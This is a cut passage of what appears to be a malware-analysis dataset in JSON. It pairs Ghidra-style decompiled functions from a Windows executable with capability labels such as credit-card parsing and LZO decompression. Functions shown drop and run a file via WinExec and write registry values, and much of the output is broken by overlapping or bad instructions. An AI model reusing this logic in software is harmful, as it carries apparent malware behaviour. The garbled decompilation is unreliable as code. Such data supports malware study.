        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004043fb) overlaps instruction at (ram,0x004043fa)\n// \n\nvoid fcn.004041b0(void)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t *extraout_ECX_01;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint unaff_EBP;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar5;\n    uint8_t uVar6;\n    uchar uVar7;\n    bool bVar8;\n    uint8_t in_IF;\n    bool bVar9;\n    uint8_t uVar10;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint32_t *puStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint uStack28;\n    uint *puStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    bVar9 = false;\n    bVar8 = in_EAX + 1 < 0;\n    uStack16 = 0x11;\n    uStack20 = 0x4104b4;\n    puStack24 = 0xc;\n    uStack28 = 0x41f9c0;\n    puStack32 = 0x4041cd;\n    fcn.00403290();\n    if ((bVar8) || (!bVar8)) {\n        puStack32 = 0xf;\n        puStack36 = 0x410714;\n    }\n    *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + (extraout_ECX + 1 >> 8);\n    puStack40 = 0x41f9c0;\n    uStack44 = 0x4041ee;\n    fcn.00403290();\n    uStack44 = 0x1a;\n    uStack48 = 0x410724;\n    uStack52 = 0xc;\n    uStack56 = 0x41f9c0;\n    uStack60 = 0x40420d;\n    fcn.00403290();\n    uStack60 = 10;\n    uStack64 = 0x410778;\n    uStack68 = 0xc;\n    uStack72 = 0x41f9c0;\n    fcn.00403290();\n    if ((0xffffffbf < &stack0xffffffb8) || (0xffffffbf >= &stack0xffffffb8)) {\n        uStack16 = 0x410784;\n        uStack20 = 0xc;\n    }\n    puVar5 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    *(extraout_EDX_00 + 0xc) = *(extraout_EDX_00 + 0xc) + (extraout_ECX_00 + 1 >> 8);\n    puStack24 = 0x41f9c0;\n    uStack28 = 0x404251;\n    fcn.00403290();\n    puStack24 = 0x8;\n    uStack28 = 0x410790;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x404275;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404294;\n    fcn.00403290();\n    puStack24 = 0x9;\n    uStack28 = 0x4107a4;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x4042b7;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x4042d2;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x4042fd;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x40432f;\n    uVar2 = fcn.00403290();\n    uVar6 = 0;\n    uVar10 = 0;\n    uVar7 = (unaff_ESI & (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + '\\x01', uVar2))) == 0;\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404350;\n    fcn.00403290();\n    if ((!uVar7) && (uVar7)) {\n        uVar10 = ((uVar10 & 1) * 0x800 & 0x800) != 0;\n        bVar9 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar7 = ((uVar7 & 1) * '@' & 0x40) != 0;\n        uVar6 = (uVar6 & 1) != 0;\n    }\n    puStack24 = 0x1b;\n    uStack28 = 0x4108f4;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x40436f;\n    iVar3 = fcn.00403290();\n    if ((uVar10) || (!uVar10)) {\n        puStack40 = 0x12;\n        uStack44 = 0x410910;\n    }\n    else {\n        *puVar5 = *unaff_ESI;\n        uVar6 = 0;\n        *extraout_ECX_01 = *extraout_ECX_01 | iVar3 + 1U;\n        uVar7 = *extraout_ECX_01 == 0;\n        unaff_ESI = unaff_ESI + bVar9 * -2 + 1;\n        puVar5 = puVar5 + bVar9 * -2 + 1;\n        puStack40 = extraout_ECX_01;\n    }\n    uStack48 = 0xc;\n    uStack52 = 0x41f9c0;\n    uStack56 = 0x404390;\n    fcn.00403290();\n    if ((uVar6 || uVar7) || (!uVar6 && !uVar7)) {\n        uStack56 = 0x40;\n    }\n    else {\n        *puVar5 = *unaff_ESI;\n        unaff_EBP = 0x6ae181d0;\n        unaff_ESI = unaff_ESI + bVar9 * -2 + 1;\n        puVar5 = puVar5 + bVar9 * -2 + 1;\n    }\n    uStack60 = 0x410924;\n    uStack64 = 0xc;\n    uStack68 = 0x41f9c0;\n    uStack72 = 0x4043bd;\n    puVar4 = fcn.00403290();\n    bVar8 = puVar5 == puVar4;\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x4043dd;\n    fcn.00403290();\n    if ((bVar8) || (!bVar8)) {\n        puStack24 = 0xb;\n        puVar4 = puVar5;\n    }\n    else {\n        uVar1 = in(extraout_EDX_01);\n        *puVar5 = uVar1;\n        puVar4 = puVar5 + bVar9 * -2 + 1;\n        puStack24 = puVar5;\n        if (&stack0xffffffec < 1) goto code_r0x00404465;\n    }\n    *(extraout_EDX_01 + 0xb) = *(extraout_EDX_01 + 0xb) ^ extraout_CH;\n    uStack28 = 0x410970;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x40440e;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404430;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404454;\n    puStack36 = puVar4;\n    puStack32 = unaff_ESI;\n    uStack28 = unaff_EBP;\n    fcn.00403290();\ncode_r0x00404465:\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404484;\n    fcn.00403290();\n    puStack24 = 0x4;\n    uStack28 = 0x410990;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x4044ae;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x4044d0;\n    fcn.00403290();\n    puStack24 = 0x16;\n    uStack28 = 0x4109a0;\n    puStack32 = 0xc;\n    puStack36 = 0x41f9c0;\n    puStack40 = 0x4044f5;\n    fcn.00403290();\n    uStack16 = 0xc;\n    uStack20 = 0x41f9c0;\n    puStack24 = 0x404530;\n    fcn.00403290();\n    return;\n}\n",
        "token_count": 2360
    },
    "00401f70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401f70(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004011d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4108e8, acStack1304, &uStack2112);\n    uStack2088 = 0x4109a0;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4109b8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402d80(auStack1564, 0x4108e4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1853
    },
    "00401ba0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401c0e) overlaps instruction at (ram,0x00401c0c)\n// \n\nbool fcn.00401ba0(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    char cVar4;\n    \n    var_4h = 0x104;\n    uVar7 = fcn.004031e0(0x80000002, 0x410924, 0x410964, &var_8h, &var_10ch, &var_4h);\n    pcVar5 = uVar7 >> 0x20;\n    uVar2 = uVar7;\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return false;\n    }\n    if (bVar6) {\n        if (!bVar6) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            do {\n                cVar4 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar4 - in_AF), -in_AF);\n            } while (in_AF || cVar4 == *pcVar5);\n            piVar1 = unaff_EDI + pcVar5 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x73) = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar3 != -1;\n}\n",
        "token_count": 510
    },
    "00401c40": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401d2c) overlaps instruction at (ram,0x00401d23)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nfloat10 __cdecl fcn.00401c40(int32_t *arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint8_t extraout_DH;\n    int32_t *unaff_ESI;\n    bool bVar5;\n    bool bVar6;\n    uchar uVar7;\n    float10 extraout_ST0;\n    float10 fVar8;\n    uint var_4h;\n    \n    uVar2 = fcn.00403310(0, arg_8h, arg_ch + 1U >> 1);\n    uVar2 = uVar2 & 0xffff;\n    bVar5 = extraout_DH < 0x36;\n    uVar7 = SBORROW1(extraout_DH, '6');\n    bVar6 = extraout_DH == 0x36;\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    fVar8 = extraout_ST0;\n    if (!bVar5 && !bVar6) {\n        if (bVar5 || bVar6) {\n            fVar8 = *(extraout_ECX + 0x7a96ed64) - extraout_ST0;\n            uVar7 = SBORROW4(&stack0xffffffec, 1);\n            unaff_ESI = arg_8h;\n        }\n    }\n    uVar1 = *(iVar3 + 0x58);\n    if (!uVar7) {\n        if (uVar7) {\n            *arg_8h = iVar3;\n            return fVar8;\n        }\n    }\n    if (uVar2 < uVar1) {\n        bVar5 = false;\n        iVar4 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        bVar5 = uVar2 < (uVar1 & 0xffff);\n        iVar4 = uVar2 - (uVar1 & 0xffff);\n    }\n    if ((!bVar5) && (bVar5)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (iVar4 < uVar1 >> 0x10) {\n        iVar4 = (iVar4 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - (uVar1 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return fVar8;\n}\n",
        "token_count": 708
    },
    "00403310": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040338a) overlaps instruction at (ram,0x00403388)\n// \n\nint32_t __cdecl fcn.00403310(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uchar *unaff_EDI;\n    uchar *puVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    uVar1 = arg_10h;\n    if (arg_10h != 0) {\n        do {\n            if ((bVar3 == uVar1 < 0) && (bVar3 != uVar1 < 0)) {\n                uVar1 = uVar1 - 1;\n                puVar2 = unaff_EDI | &stack0xfffffffc;\n                unaff_EDI = puVar2 + 1;\n                *puVar2 = arg_10h;\n                arg_8h = arg_8h & 0xffffff00;\n            }\n            arg_8h = arg_8h + *arg_ch;\n            arg_10h = arg_8h >> 0x10;\n            if (arg_8h >> 0x10 != 0) {\n                if ((-1 < arg_8h) && (-1 >= arg_8h)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                arg_10h = arg_10h + (arg_8h & 0xffff);\n                arg_8h = arg_10h;\n            }\n            arg_ch = arg_ch + 1;\n            bVar3 = SBORROW4(uVar1, 1);\n            uVar1 = uVar1 - 1;\n        } while (uVar1 != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 430
    },
    "00402170": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402335) overlaps instruction at (ram,0x00402332)\n// \n// WARNING: Removing unreachable block (ram,0x004021d9)\n// WARNING: Removing unreachable block (ram,0x00402254)\n// WARNING: Removing unreachable block (ram,0x004021de)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00402170(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    code *pcVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint *puVar10;\n    uint *puVar11;\n    bool bVar12;\n    float10 extraout_ST0;\n    uchar auStack800 [99];\n    uint32_t uStack701;\n    uint *puStack697;\n    uchar *puStack693;\n    uchar *puStack689;\n    uchar *puStack685;\n    uint uStack681;\n    uchar *puStack677;\n    uint *puStack673;\n    uint uStack669;\n    uchar *puStack665;\n    uchar *puStack661;\n    uchar *puStack657;\n    uchar *puStack653;\n    uchar uStack649;\n    uchar uStack648;\n    ushort uStack647;\n    uchar uStack645;\n    uchar uStack644;\n    ushort uStack643;\n    uchar *puStack641;\n    uchar *puStack637;\n    uchar uStack633;\n    uchar auStack632 [2];\n    ushort uStack630;\n    uchar uStack616;\n    uint uStack615;\n    uchar auStack540 [184];\n    char cStack356;\n    uint uStack355;\n    uchar auStack280 [184];\n    uint auStack96 [5];\n    int32_t aiStack76 [5];\n    uint auStack56 [5];\n    uchar *apuStack36 [4];\n    uchar *puStack20;\n    uint uStack16;\n    uint *puStack12;\n    uint *puStack8;\n    \n    pcVar4 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack693 = &stack0xfffffffc;\n    uStack616 = 0;\n    puVar10 = &stack0xfffffd99;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    cStack356 = '\\0';\n    puVar10 = &stack0xfffffe9d;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uStack16 = 1;\n    puStack8 = NULL;\n    puStack12 = 0x1;\n    uVar8 = param_2 != 0;\n    uStack630 = 1;\n    uStack633 = param_1 >> 0x18;\n    uVar5 = uStack633;\n    puStack637 = param_1 << 8;\n    uStack644 = SUB41(&stack0xfffffe9c, 0);\n    uStack643 = &stack0xfffffe9c >> 8;\n    puStack641._0_1_ = &stack0xfffffe9c >> 0x18;\n    puStack641 = CONCAT31(0x410530, puStack641._0_1_);\n    uStack648 = 1;\n    uStack647 = 0x4022;\n    uStack645 = 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack637 = param_1 << 8;\n    uStack644 = SUB41(&stack0xfffffd98, 0);\n    uStack643 = &stack0xfffffd98 >> 8;\n    puStack641._0_1_ = &stack0xfffffd98 >> 0x18;\n    puStack641 = CONCAT31(0x410548, puStack641._0_1_);\n    uStack648 = 0x13;\n    uStack647 = 0x4022;\n    uStack645 = 0;\n    uStack633 = uVar5;\n    (*pcVar4)();\n    apuStack36[0] = &stack0xfffffe9c;\n    apuStack36[2] = &stack0xfffffff0;\n    apuStack36[3] = &stack0xfffffff8;\n    puStack20 = &stack0xfffffff4;\n    uVar7 = 0xffffffff;\n    puStack637 = NULL;\n    pcVar9 = &stack0xfffffe9c;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar1 != '\\0');\n    aiStack76[0] = ~uVar7 - 1;\n    bVar12 = false;\n    uVar7 = 0xffffffff;\n    puVar10 = param_1;\n    do {\n        puVar11 = puVar10;\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        puVar11 = puVar10 + 1;\n        bVar12 = *puVar10 != '\\0';\n        cVar1 = *puVar10;\n        puVar10 = puVar11;\n    } while (cVar1 != '\\0');\n    aiStack76[1] = ~uVar7 - 1;\n    auStack56[0] = 0x410570;\n    auStack56[1] = 0x41057c;\n    auStack56[2] = 0x410588;\n    auStack56[3] = 0x410598;\n    auStack56[4] = 0x4105a0;\n    auStack96[0] = 2;\n    auStack96[1] = 1;\n    auStack96[2] = 4;\n    auStack96[3] = 4;\n    auStack96[4] = 4;\n    apuStack36[1] = param_1;\n    aiStack76[2] = 4;\n    aiStack76[3] = 4;\n    aiStack76[4] = 4;\n    if ((aiStack76[1] == 0) || (uStack633 = puVar11 >> 0x18,  aiStack76[1] != 0)) {\n        if (4 < uVar8) {\n            return 1;\n        }\n    }\n    else {\n        uVar2 = in(4);\n        *puVar11 = uVar2;\n        if (&stack0xfffffd88 < 1) {\n            if ((bVar12) || (!bVar12)) {\n                puStack637 = &stack0xfffffff0;\n            }\n            uVar8 = puVar11 + 1 ^ *(puVar11 + 0xe58be77);\n            puStack685 = &stack0xf4458d72;\n            puStack641 = &stack0xfffffde4;\n            uStack645 = 0x46;\n            uStack644 = 0x23;\n            uStack643 = 0x40;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n            if (iVar6 == 0) {\n                return 0;\n            }\n            puStack8 = param_1;\n            puStack12 = param_1;\n            uStack645 = SUB41(&stack0xffffffec, 0);\n            uStack644 = &stack0xffffffec >> 8;\n            uStack643 = &stack0xffffffec >> 0x10;\n            puStack653 = &stack0xfffffce0;\n            uStack649 = SUB41(&stack0xfffffff4, 0);\n            uStack648 = &stack0xfffffff4 >> 8;\n            uStack647 = &stack0xfffffff4 >> 0x10;\n            puStack657 = &stack0xfffffff8;\n            puStack661 = &stack0xfffffee8;\n            puStack665 = &stack0xfffffde4;\n            uStack669 = 0;\n            puStack673 = 0x40238c;\n            puStack689 = &stack0xfffffd63;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n            if (iVar6 == 0) {\n                return 0;\n            }\n            puStack673 = param_1;\n            puStack677 = &stack0xfffffee8;\n            uStack681 = 0x4023b0;\n            uStack701 = uVar8;\n            puStack697 = param_1;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n            if (iVar6 == 0) {\n                return 0;\n            }\n            if ((-1 < iVar6) && (-1 >= iVar6)) {\n                *(uVar8 + 0x1c) = extraout_ST0;\n            }\n            return 1;\n        }\n        *(uVar8 + 0x3b7305fb) = *(uVar8 + 0x3b7305fb) ^ 0x10;\n    }\n    pcVar4 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    uVar8 = uVar8 * 4;\n    do {\n        puStack637 = *(&stack0xffffffb4 + uVar8);\n        puStack641 = *(&stack0xffffffdc + uVar8);\n        uVar2 = *(&stack0xffffffa0 + uVar8);\n        uVar3 = *(&stack0xffffffc8 + uVar8);\n        uStack645 = uVar2;\n        uStack644 = uVar2 >> 8;\n        uStack643 = uVar2 >> 0x10;\n        puStack653 = &stack0xfffffd98;\n        uStack649 = uVar3;\n        uStack648 = uVar3 >> 8;\n        uStack647 = uVar3 >> 0x10;\n        puStack657 = 0x80000002;\n        puStack661 = 0x4022ee;\n        iVar6 = (*pcVar4)();\n        if (iVar6 != 0) {\n            return 0;\n        }\n        uVar8 = uVar8 + 4;\n    } while (uVar8 < 0x14);\n    return 1;\n}\n",
        "token_count": 2396
    },
    "00402a20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00402a20(void)\n\n{\n    uint32_t extraout_EDX;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 138
    },
    "00402e90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f88) overlaps instruction at (ram,0x00402f86)\n// \n// WARNING: Removing unreachable block (ram,0x00402eee)\n// WARNING: Removing unreachable block (ram,0x00402e83)\n\nuint32_t fcn.00402e90(void)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uint8_t uVar8;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char cVar9;\n    uint32_t extraout_ECX;\n    uint8_t *puVar10;\n    uint32_t unaff_EBX;\n    uint32_t uVar11;\n    uchar *puVar12;\n    uint *unaff_ESI;\n    uint *puVar13;\n    uint32_t unaff_EDI;\n    uint *puVar14;\n    ushort in_CS;\n    ulong uVar15;\n    uint32_t in_stack_00000010;\n    uint32_t uStack32;\n    uchar auStack4 [4];\n    \n    puVar12 = auStack4;\n    uVar6 = in_stack_00000010 * 2;\n    uStack32 = unaff_EDI;\n    if (0 < in_stack_00000010) {\n        do {\n            uVar8 = (uVar6 >> 8) - 1;\n            puVar14 = *(puVar12 + -8);\n            uVar1 = *(puVar14 + *(puVar12 + 0x10));\n            uVar11 = unaff_EBX & 0xffffff00 | uVar1;\n            if (uVar8 < 6) {\ncode_r0x00402ef7:\n                puVar13 = *(puVar12 + -0xc);\n            }\n            else {\n                uVar11 = unaff_EBX & 0xffff0000 | unaff_EBX & 0xff00 | uVar1;\n                if (5 < uVar8) goto code_r0x00402ef7;\n                puVar13 = unaff_ESI + 1;\n                *puVar14 = *unaff_ESI;\n                uVar11 = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, uVar1);\n                puVar12 = 0x8be181d0;\n                puVar14 = puVar14 + 1;\n            }\n            uVar1 = *(puVar13 % *(puVar12 + 0xc) + *(puVar12 + 8));\n            uVar6 = uVar6 & 0xffffff00 | uVar1;\n            puVar12[-1] = uVar1;\n            iVar7 = uVar6 - *(puVar12 + 8);\n            uVar5 = iVar7 & 0xff00 | iVar7 ^ iVar7 >> 8 | 0x3d00 | uVar11;\n            cVar4 = uVar5;\n            cVar9 = uVar5 >> 8;\n            if ((cVar4 < cVar9) && (cVar9 <= cVar4)) {\n                uVar15 = (*(uVar6 + 0x8b0c7df7))(in_CS);\n                puVar10 = uVar15 >> 0x20;\n                puVar12 = puVar12 + 1;\n                *puVar10 = *puVar10 | uVar15 >> 0x28;\n                uVar3 = uVar15 & 0xffffff00 | uVar15 - 2;\n                uVar6 = extraout_ECX;\n            }\n            else {\n                uVar3 = *(puVar12 + 8);\n                uVar11 = uVar11 & 0xffffff00 | uVar11 ^ *((puVar13 + -1) % *(puVar12 + 0xc) + uVar3);\n            }\n            uVar11 = uVar11 + 1;\n            *(uVar3 + 0x5239da56) = *(uVar3 + 0x5239da56) ^ uVar6;\n            uVar1 = puVar12[-0x10];\n            uVar6 = uVar6 & 0xffffff00;\n            puVar2 = *(puVar12 + 0x18);\n            uVar3 = 